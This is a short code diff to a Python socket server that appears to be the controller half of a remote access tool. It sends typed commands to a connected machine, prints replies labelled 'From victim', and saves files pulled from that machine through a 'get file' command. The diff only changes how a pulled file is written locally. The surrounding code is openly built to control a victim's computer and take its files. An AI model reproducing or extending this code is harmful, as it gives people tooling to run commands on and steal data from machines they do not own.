@@ -13,9 +13,9 @@ def server():
         client_socket.send(command.encode('utf-8'))
         data = client_socket.recv(1024).decode('utf-8')
         if 'get file ' in command:
-            command = command.replace('get file ', '')
-            with open(command, 'wb')as file:
-                file.writelines(data)
+            file_path = input("Please enter the path of the file")
+            with open(file_path, 'wb')as f:
+                f.write(data.encode('utf-8'))
 
         print('From victim: ' + data)
     client_socket.close()
